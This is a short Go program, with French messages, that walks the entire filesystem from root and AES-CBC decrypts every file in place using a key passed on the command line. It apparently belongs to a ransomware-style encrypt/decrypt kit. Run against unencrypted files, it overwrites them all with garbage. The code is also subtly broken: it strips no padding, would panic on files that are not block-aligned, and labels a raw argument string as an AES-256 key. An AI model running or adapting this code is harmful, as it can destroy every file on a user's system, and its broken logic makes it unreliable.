package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
)

// Decrypt data with AES-256
func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)

	return ciphertext, nil
}

// Decrypt a file
func decryptFile(filename string, key []byte) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	decryptedData, err := decrypt(data, key)
	if err != nil {
		return err
	}

	err = os.WriteFile(filename, decryptedData, 0644)
	if err != nil {
		return err
	}

	fmt.Println("Fichier déchiffré avec succès :", filename)
	return nil
}

// Main function of the program
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Veuillez fournir la clé en argument.")
		return
	}
	key := []byte(os.Args[1])

	root := string(os.PathSeparator)
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Erreur ", err)
			return err
		}
		if !info.IsDir() {
			err = decryptFile(path, key)
			if err != nil {
				fmt.Println("Erreur lors du déchiffrement du fichier", path, ":", err)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Println("Erreur lors de la marche à travers les fichiers :", err)
		return
	}

	fmt.Println("Déchiffrement terminé pour tous les fichiers du système de fichiers.")
}
